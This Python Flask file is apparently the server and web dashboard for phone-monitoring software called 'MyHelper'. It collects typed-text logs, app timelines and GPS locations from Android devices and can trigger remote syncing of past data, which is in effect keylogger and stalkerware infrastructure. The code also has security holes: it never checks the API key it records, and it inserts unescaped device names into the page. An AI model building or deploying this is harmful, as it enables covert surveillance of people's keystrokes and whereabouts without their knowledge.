from flask import Flask, request, jsonify, render_template_string
import json
import os
import sys
import io
from datetime import datetime

# Set UTF-8 encoding for Windows console compatibility
if sys.stdout and sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    except Exception:
        pass

if sys.stderr and sys.stderr.encoding and sys.stderr.encoding.lower() != 'utf-8':
    try:
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except Exception:
        pass

app = Flask(__name__)
LOG_FILE = "phone_logs.json"
SYNC_REQUESTED = False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MyHelper Multi-Device Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        body { background: #f1f5f9; color: #1e293b; min-height: 100vh; padding: 24px; }
        .container { max-width: 1200px; margin: 0 auto; }
        
        header { display: flex; justify-content: space-between; align-items: center; padding: 18px 28px; background: #ffffff; border-radius: 16px; border: 1px solid #e2e8f0; margin-bottom: 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.04); }
        h1 { font-size: 1.4rem; color: #0284c7; font-weight: 700; display: flex; align-items: center; gap: 10px; }
        .status-badge { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; background: #ecfdf5; color: #059669; padding: 6px 14px; border-radius: 20px; border: 1px solid #a7f3d0; font-weight: 600; }
        .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }

        .device-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .device-tab { background: #ffffff; color: #64748b; border: 1px solid #e2e8f0; padding: 10px 18px; border-radius: 10px; cursor: pointer; transition: all 0.2s; font-size: 0.9rem; font-weight: 600; box-shadow: 0 2px 6px rgba(0,0,0,0.02); }
        .device-tab:hover { background: #e2e8f0; color: #0f172a; }
        .device-tab.active { background: #0284c7; color: #ffffff; border-color: #0284c7; box-shadow: 0 4px 12px rgba(2, 132, 199, 0.25); }

        .controls { display: flex; gap: 15px; margin-bottom: 24px; flex-wrap: wrap; justify-content: space-between; align-items: center; }
        .filter-group { display: flex; gap: 8px; flex-wrap: wrap; }
        .filter-btn { background: #ffffff; color: #64748b; border: 1px solid #e2e8f0; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: all 0.2s; }
        .filter-btn.active { background: #2563eb; color: #ffffff; border-color: #2563eb; box-shadow: 0 4px 10px rgba(37, 99, 235, 0.2); }
        .search-box { background: #ffffff; border: 1px solid #cbd5e1; color: #1e293b; padding: 8px 14px; border-radius: 8px; font-size: 0.85rem; width: 250px; outline: none; transition: border-color 0.2s; }
        .search-box:focus { border-color: #0284c7; }

        .btn-primary { background: #0284c7; color: #ffffff; border: 1px solid #0284c7; padding: 9px 18px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: background 0.2s, transform 0.1s; box-shadow: 0 4px 10px rgba(2, 132, 199, 0.2); }
        .btn-primary:hover { background: #0369a1; transform: translateY(-1px); }
        .btn-danger { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; padding: 9px 18px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: background 0.2s; }
        .btn-danger:hover { background: #fca5a5; color: #7f1d1d; }

        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
        .stat-card { background: #ffffff; padding: 18px; border-radius: 14px; border: 1px solid #e2e8f0; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
        .stat-card h3 { font-size: 0.75rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; font-weight: 700; }
        .stat-card p { font-size: 1.6rem; font-weight: 700; color: #0f172a; }

        .log-list { display: flex; flex-direction: column; gap: 14px; }
        .log-item { background: #ffffff; border-radius: 14px; border: 1px solid #e2e8f0; padding: 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.02); transition: transform 0.15s, border-color 0.15s; }
        .log-item:hover { border-color: #cbd5e1; transform: translateY(-1px); }
        .log-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .log-type { padding: 4px 10px; border-radius: 6px; font-size: 0.75rem; font-weight: 700; }
        .type-TYPED_TEXT { background: #fef9c3; color: #854d0e; border: 1px solid #fde047; }
        .type-APP_TIMELINE { background: #dbeafe; color: #1e40af; border: 1px solid #bfdbfe; }
        .type-LOCATION, .type-GPS_LOCATION { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
        .type-HEARTBEAT { background: #f1f5f9; color: #475569; border: 1px solid #e2e8f0; }
        .type-GENERAL, .type-OFFLINE_BACKLOG_SYNC { background: #f3e8ff; color: #6b21a8; border: 1px solid #e9d5ff; }
        .log-device { font-weight: 700; color: #0284c7; font-size: 0.9rem; }
        .log-time { color: #94a3b8; font-size: 0.8rem; font-weight: 500; }
        .log-content { white-space: pre-wrap; font-family: 'Fira Code', monospace; font-size: 0.9rem; background: #f8fafc; padding: 12px 14px; border-radius: 10px; border: 1px solid #e2e8f0; color: #334155; word-break: break-word; }
        
        .empty-state { text-align: center; padding: 60px; color: #94a3b8; background: #ffffff; border-radius: 16px; border: 1px dashed #cbd5e1; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>⚡ MyHelper Multi-Device Live Dashboard</h1>
            <div class="status-badge"><div class="pulse"></div> Live Receiver Active</div>
        </header>

        <div class="stats-grid">
            <div class="stat-card"><h3>Connected Devices</h3><p id="statDevices">0</p></div>
            <div class="stat-card"><h3>Total Logs</h3><p id="statTotal">0</p></div>
            <div class="stat-card"><h3>Typed Text History</h3><p id="statTyped">0</p></div>
            <div class="stat-card"><h3>Last Sync Time</h3><p id="statLastSync">--:--</p></div>
        </div>

        <div class="device-bar" id="deviceTabs">
            <button class="device-tab active" onclick="selectDevice('ALL')">📱 All Devices</button>
        </div>

        <div class="controls">
            <div class="filter-group">
                <button class="filter-btn active" onclick="setFilter('ALL', event)">All Logs</button>
                <button class="filter-btn" onclick="setFilter('TYPED_TEXT', event)">⌨️ Typed Text</button>
                <button class="filter-btn" onclick="setFilter('APP_TIMELINE', event)">📱 App Timeline</button>
                <button class="filter-btn" onclick="setFilter('LOCATION', event)">📍 Location</button>
            </div>
            <div style="display: flex; gap: 10px;">
                <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search logs..." oninput="renderLogs()">
                <button class="btn-primary" id="btnFetchSync" onclick="requestSync()">📥 Fetch Past Data (Sync Now)</button>
                <button class="btn-danger" onclick="clearLogs()">🗑️ Clear Logs</button>
            </div>
        </div>

        <div class="log-list" id="logList">
            <div class="empty-state">Waiting for incoming logs from Android app...</div>
        </div>
    </div>

    <script>
        let allLogs = [];
        let currentDevice = 'ALL';
        let currentFilter = 'ALL';

        async function fetchLogs() {
            try {
                const res = await fetch('/api/logs');
                allLogs = await res.json();
                updateStatsAndTabs();
                renderLogs();
            } catch (e) { console.error("Error fetching logs", e); }
        }

        async function requestSync() {
            const btn = document.getElementById('btnFetchSync');
            btn.disabled = true;
            btn.innerText = "⏳ Sync Requested...";
            try {
                await fetch('/api/request_sync', { method: 'POST' });
                setTimeout(() => {
                    fetchLogs();
                    btn.disabled = false;
                    btn.innerText = "📥 Fetch Past Data (Sync Now)";
                }, 3000);
            } catch (e) {
                btn.disabled = false;
                btn.innerText = "📥 Fetch Past Data (Sync Now)";
            }
        }

        function updateStatsAndTabs() {
            document.getElementById('statTotal').innerText = allLogs.length;
            const typedCount = allLogs.filter(l => l.type === 'TYPED_TEXT').length;
            document.getElementById('statTyped').innerText = typedCount;
            if (allLogs.length > 0) {
                document.getElementById('statLastSync').innerText = allLogs[0].timestamp.split(' ')[1] || allLogs[0].timestamp;
            } else {
                document.getElementById('statLastSync').innerText = "--:--";
            }

            const devices = [...new Set(allLogs.map(l => l.device))];
            document.getElementById('statDevices').innerText = devices.length;

            const tabsContainer = document.getElementById('deviceTabs');
            let html = `<button class="device-tab ${currentDevice === 'ALL' ? 'active' : ''}" onclick="selectDevice('ALL')">📱 All Devices (${allLogs.length})</button>`;
            
            devices.forEach(d => {
                const count = allLogs.filter(l => l.device === d).length;
                html += `<button class="device-tab ${currentDevice === d ? 'active' : ''}" onclick="selectDevice('${d}')">📱 ${d} (${count})</button>`;
            });
            tabsContainer.innerHTML = html;
        }

        function selectDevice(device) {
            currentDevice = device;
            updateStatsAndTabs();
            renderLogs();
        }

        function setFilter(type, evt) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
            if(evt && evt.target) evt.target.classList.add('active');
            renderLogs();
        }

        function renderLogs() {
            const search = document.getElementById('searchBox').value.toLowerCase();
            const container = document.getElementById('logList');

            const filtered = allLogs.filter(log => {
                const matchDevice = currentDevice === 'ALL' || log.device === currentDevice;
                const matchFilter = currentFilter === 'ALL' || log.type === currentFilter || (currentFilter === 'LOCATION' && log.type === 'GPS_LOCATION');
                const matchSearch = (log.content || '').toLowerCase().includes(search) || (log.device || '').toLowerCase().includes(search);
                return matchDevice && matchFilter && matchSearch;
            });

            if (filtered.length === 0) {
                container.innerHTML = '<div class="empty-state">No matching logs found.</div>';
                return;
            }

            container.innerHTML = filtered.map(log => `
                <div class="log-item">
                    <div class="log-header">
                        <div>
                            <span class="log-device">📱 ${log.device || 'Unknown Device'}</span>
                            <span class="log-type type-${log.type}">${log.type}</span>
                        </div>
                        <span class="log-time">🕒 ${log.timestamp}</span>
                    </div>
                    <div class="log-content">${escapeHtml(log.content || '')}</div>
                </div>
            `).join('');
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        async function clearLogs() {
            if (confirm("Are you sure you want to clear all recorded logs?")) {
                await fetch('/api/clear', { method: 'POST' });
                fetchLogs();
            }
        }

        fetchLogs();
        setInterval(fetchLogs, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/request_sync', methods=['POST'])
def request_sync():
    global SYNC_REQUESTED
    SYNC_REQUESTED = True
    return jsonify({"status": "sync_requested", "message": "Sync flag set to True"})

@app.route('/api/command', methods=['GET'])
def get_command():
    global SYNC_REQUESTED
    flag = SYNC_REQUESTED
    if flag:
        SYNC_REQUESTED = False
    return jsonify({"sync_requested": flag})

@app.route('/api/logs', methods=['GET'])
def get_logs():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                return jsonify(json.load(f))
        except Exception:
            return jsonify([])
    return jsonify([])

@app.route('/api/clear', methods=['POST'])
def clear_logs():
    with open(LOG_FILE, "w") as f:
        json.dump([], f)
    return jsonify({"status": "cleared"})

def is_duplicate_log(existing_logs, entry):
    dev = entry.get("device")
    ts = entry.get("timestamp")
    tp = entry.get("type")
    cnt = entry.get("content")
    for existing in existing_logs:
        if (existing.get("device") == dev and
            existing.get("timestamp") == ts and
            existing.get("type") == tp and
            existing.get("content") == cnt):
            return True
    return False

@app.route('/api/log', methods=['POST'])
def receive_log():
    api_key = request.headers.get("X-API-KEY", "")
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No JSON payload"}), 400

    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except Exception:
            logs = []

    added_count = 0
    if isinstance(data, list):
        for item in reversed(data):
            if isinstance(item, dict):
                log_entry = {
                    "timestamp": item.get("timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
                    "device": item.get("device", "Android Phone"),
                    "type": item.get("type", "GENERAL"),
                    "content": item.get("content", ""),
                    "api_key": api_key
                }
                if not is_duplicate_log(logs, log_entry):
                    logs.insert(0, log_entry)
                    added_count += 1
        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=2)
        return jsonify({"status": "success", "added": added_count, "total_received": len(data)}), 200

    device = data.get("device", "Android Phone")
    log_type = data.get("type", "GENERAL")
    content = data.get("content", "")
    timestamp = data.get("timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    log_entry = {
        "timestamp": timestamp,
        "device": device,
        "type": log_type,
        "content": content,
        "api_key": api_key
    }
    if not is_duplicate_log(logs, log_entry):
        logs.insert(0, log_entry)
        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=2)

    return jsonify({"status": "success", "message": "Log received on Localhost!"}), 200

if __name__ == '__main__':
    print("\n" + "="*60)
    print("[+] MyHelper Multi-Device Server & Web Dashboard Started!")
    print("[+] Web Dashboard URL: http://localhost:5000")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000)
